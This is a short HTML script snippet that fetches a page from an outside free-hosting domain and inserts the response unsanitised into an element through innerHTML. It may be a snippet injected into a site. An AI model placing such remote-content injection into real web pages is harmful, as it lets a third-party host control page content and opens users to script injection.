<script>
fetch('http://kill6net.wuaze.com/index.php')
.then(response => response.text())
.then(data => {
document.getElementById('result').innerHTML = data;
})
.catch(error => console.error('Error:', error));
</script>